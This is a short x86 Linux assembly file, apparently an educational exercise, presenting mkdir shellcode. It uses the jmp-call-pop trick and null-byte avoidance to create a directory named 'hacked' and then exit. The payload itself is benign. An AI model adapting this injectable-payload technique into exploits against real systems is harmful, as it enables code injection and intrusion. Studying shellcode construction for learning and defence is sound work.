;; mkdir_shellcode.asm
; Author: Mutti K
; Purpose: Demonstrate polymorphic version of mkdir shellcode.

global _start

section .text
_start:
	jmp short Label1
Label2:
	pop esi ; Store address of new dir name 'hacked'
	xor eax,eax
	mov [esi+0x6],al
	;syscall mkdir() 0x27
	mov al,0x27
	lea ebx,[esi] ; Load address of new dir name 'hacked'
	mov cx,0x1ed ; new dir mode 0x1ed = 755 octal
	int 0x80
	;syscall exit() 0x01
	mov al,0x1
	xor ebx,ebx
	int 0x80
Label1:
	call Label2
	hacked: db 0x68,0x61,0x63,0x6B,0x65,0x64
